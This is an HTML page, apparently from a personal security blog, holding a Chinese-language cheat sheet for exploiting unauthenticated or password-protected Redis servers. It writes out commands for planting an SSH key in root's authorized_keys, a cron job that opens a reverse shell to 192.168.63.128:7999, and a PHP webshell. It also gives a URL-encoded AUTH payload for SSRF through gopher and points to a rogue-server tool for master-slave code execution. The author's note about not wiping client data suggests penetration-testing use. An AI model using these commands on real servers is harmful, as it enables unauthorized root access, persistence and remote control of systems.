@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>Redis攻击备忘录 | chriskali&#39;s blog</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://chriskalix.github.io/favicon.ico?v=1592112345647">
+<link rel="stylesheet" href="https://chriskalix.github.io/styles/main.css">
+
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="REDIS未授权访问的利用
+
+目前比较全的文章
+
+Linux下的利用
+在linux下的利用主要有三种
+
+1. 写入ssh公钥
+2. 写crontab
+3. 写webshell
+
+用redis-cli
+
+[*] 注意:redis敏感，注意客户..." />
+    <meta name="keywords" content="" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://chriskalix.github.io">
+        <img src="https://chriskalix.github.io/images/avatar.png?v=1592112345647" class="site-logo">
+        <h1 class="site-title">chriskali&#39;s blog</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      Keep learning
+    </div>
+    <div class="site-footer">
+      chriskalix | <a class="rss" href="https://chriskalix.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">Redis攻击备忘录</h2>
+            <div class="post-date">2020-06-14</div>
+            
+            <div class="post-content" v-pre>
+              <h2 id="redis未授权访问的利用">REDIS未授权访问的利用</h2>
+<blockquote>
+<p>目前比较全的<a href="https://paper.seebug.org/975/">文章</a></p>
+</blockquote>
+<h3 id="linux下的利用">Linux下的利用</h3>
+<pre><code class="language-txt">在linux下的利用主要有三种
+
+1. 写入ssh公钥
+2. 写crontab
+3. 写webshell
+
+用redis-cli
+
+[*] 注意:redis敏感，注意客户环境，不要覆盖客户的变量数据，更不要清空，小心操作
+</code></pre>
+<h4 id="1-写ssh公钥">1. 写ssh公钥</h4>
+<pre><code class="language-txt">条件：
+
+1. 目标开启ssh，且允许密钥登录
+2. Redis使用root账号启动
+
+步骤如下：
+
+1. `ssh-keygen -t rsa`在本地生成ssh密钥对，本机是root，所以生成在`/root/.ssh/`目录下，id_rsa为私钥，id_rsa.pub为公钥。
+2. redis执行命令，`config set dir /root/.ssh/`将目录切换到`/root/.ssh/`，执行`config set dbfilename authorized_keys`，再将public_key写入变量后执行save。对于写入key:`(echo -e &quot;\n\n&quot;;cat id_rsa.pub; echo -e &quot;\n\n&quot;)&gt; 1.txt`，然后再`cat 1.txt | redis-cli -h xx.xx.xx.xx -x set test`，然后进入执行`save test`，便可以进行登录。
+</code></pre>
+<h4 id="2-写定时任务">2. 写定时任务</h4>
+<pre><code class="language-txt">条件：
+需要装有定时任务(有一次进入服务器内没有定时任务)
+有写的权限
+
+1. 设置变量 `set x &quot;\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.63.128/7999 0&gt;&amp;1\n&quot;`
+2. 切换路径 `config set dir /var/spool/cron/`
+3. 设置文件名 `config set dbfilename root`
+4. 保存至文件 `save`
+</code></pre>
+<h4 id="3-写webshell">3. 写webshell</h4>
+<pre><code class="language-txt">条件：
+有写的权限
+知道网站的绝对路径
+
+1. 设置路径 `config set dir /var/www/html/`
+2. 设置文件名 `config set dbfilename shell.php`
+3. 设置变量 `set x &quot;&lt;?php phpinfo();?&gt;&quot;`
+4. 保存变量 `save`
+</code></pre>
+<h3 id="windows下的利用">windows下的利用</h3>
+<h4 id="1-写webshell同上">1. 写webshell（同上）</h4>
+<h4 id="2-写启动项">2. 写启动项</h4>
+<pre><code class="language-txt">C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/startup/
+</code></pre>
+<h3 id="坑点">坑点</h3>
+<p>写<code>crontab</code>的时候，一定要注意，不一定所有系统都包含crontab服务</p>
+<h2 id="攻击带有密码的redis">攻击带有密码的redis</h2>
+<blockquote>
+<p>近期在看redis未授权，大部分提到的都是ssrf + 授权的redis， 即用<code>gopher://</code>协议进行攻击。那么如果内网redis带有密码或者别的认证的情况下呢？找到了相关文章学习了一下</p>
+</blockquote>
+<p>这篇<a href="https://zhuanlan.zhihu.com/p/74324307">文章</a>提及到了如何攻击带有密码的redis</p>
+<h3 id="前提知识">前提知识</h3>
+<p>Redis服务器与客户端通过RESP（REdis Serialization Protocol）协议通信。RESP协议-简书这边文章简单地描述了该协议的格式，在ssrf的时候我们要将payload转化为这一种类型格式</p>
+<h3 id="具体细节">具体细节</h3>
+<p>其实读完上述文章后了解到后续写shell的地方都是差不多的，只是前面的内容有所不同。之前复习gopher写shell的时候其实已经了解到，redis可以一次性写入多条语句执行，最后读取执行结果。</p>
+<p>那么认证的redis本质上只是多了前面判断认证的过程，具体为<code>%2A2%0d%0a%244%0d%0aAUTH%0d%0a%246%0d%0a123123%0D%0A</code></p>
+<h3 id="认为不对的地方">认为不对的地方</h3>
+<p>在观察这些<code>payload</code>的时候，都会发现一个问题，就是他们都包含了<code>flushall</code>这个操作。如果是在实际环境进行测试，我认为<code>flushall</code>应该不妥吧...</p>
+<h2 id="知识扩展">知识扩展</h2>
+<p>对于写redis shell，看文章最常见的就是gopher协议，那么如果gopher协议被禁用呢</p>
+<p>找到<a href="https://www.cnblogs.com/-chenxs/p/11749367.html">参考文章</a>，继续探索</p>
+<h3 id="其他方法">其他方法</h3>
+<h4 id="header-crlf注入">header CRLF注入</h4>
+<p>这个攻击方式较为少见，比较适用于weblogic的SSRF攻击</p>
+<h4 id="dict协议">dict协议</h4>
+<h2 id="主从复制">主从复制</h2>
+<h3 id="前置知识">前置知识</h3>
+<h4 id="什么是主从复制">什么是主从复制</h4>
+<p>当Redis是单个实例的时候，当读写量较大时服务器难以承受。主从模式即指定一个redis实例作为主机，其他都是备份机，从机只负责读，主机只负责写来分担压力</p>
+<h4 id="主从复制getshell优点">主从复制getshell优点</h4>
+<p>主从复制Getshell有什么优点：现在容器化、组件化不断发展，导致在容器内往往只有一个服务，那么通过写webshell，crontab，ssh等getshell的操作会越来越难，而主从复制漏洞不依赖其他服务，直接getshell</p>
+<h4 id="redis模块">redis模块</h4>
+<p>redis4.x之后，新增了模块功能，通过外部扩展，可以在redis中实现一个新的redis命令。redis模块实际是一个动态库，他能够让redis-cli使用module load把他加载到redis内核</p>
+<h4 id="payload">payload</h4>
+<p>https://github.com/LoRexxar/redis-rogue-server</p>
+<p>另一<a href="https://www.t00ls.net/articles-56339.html">好文</a></p>
+
+            </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://chriskalix.github.io/post/php-hou-men-andte-xing-ji-lu/">
+                  <h3 class="post-title">
+                    PHP后门&amp;特性记录
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+
+
+  </body>
+</html>
